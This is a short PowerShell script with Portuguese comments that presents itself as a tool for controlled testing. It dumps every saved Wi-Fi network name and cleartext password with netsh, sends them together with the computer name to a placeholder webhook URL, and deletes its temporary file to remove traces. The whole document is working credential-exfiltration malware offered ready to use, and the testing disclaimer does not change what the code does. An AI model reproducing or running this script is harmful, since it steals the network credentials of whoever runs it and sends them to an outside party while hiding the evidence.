# 🛰️ Exfiltra senhas Wi-Fi salvas e envia para um webhook (uso em ambiente de testes controlado)

$dc = 'SEU_WEBHOOK_AQUI'
$whuri = "$dc"

# Deteção de encurtadores (opcional)
if ($whuri.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    try {
        $whuri = (Invoke-RestMethod -Uri $whuri).url
    } catch {
        Write-Host "Erro ao expandir URL."
    }
}

# Coleta perfis Wi-Fi
$outfile = ""
$a = 0
$ws = (netsh wlan show profiles) -replace ".*:\s+"
foreach ($s in $ws) {
    if (
        $a -gt 1 -and
        $s -notmatch " policy " -and
        $s -ne "User profiles" -and
        $s -notmatch "-----" -and
        $s -notmatch "<None>" -and
        $s.Length -gt 5
    ) {
        $ssid = $s.Trim()
        if ($s -match ":") {
            $ssid = $s.Split(":")[1].Trim()
        }

        $pw = (netsh wlan show profiles name=$ssid key=clear)
        $pass = "None"
        foreach ($p in $pw) {
            if ($p -match "Key Content") {
                $pass = $p.Split(":")[1].Trim()
                $outfile += "SSID: $ssid : Password: $pass`n"
            }
        }
    }
    $a++
}

# Salva em arquivo temporário
$Pathsys = "$env:temp\wifi_info.txt"
$outfile | Out-File -FilePath $Pathsys -Encoding ASCII -Append

# Monta JSON e envia
$msgsys = Get-Content -Path $Pathsys -Raw
$escmsgsys = $msgsys -replace '[&<>]', {
    $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')
}
$jsonsys = @{
    username = "$env:COMPUTERNAME"
    content  = $escmsgsys
} | ConvertTo-Json -Depth 3

Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

# Remove rastros
Remove-Item -Path $Pathsys -Force
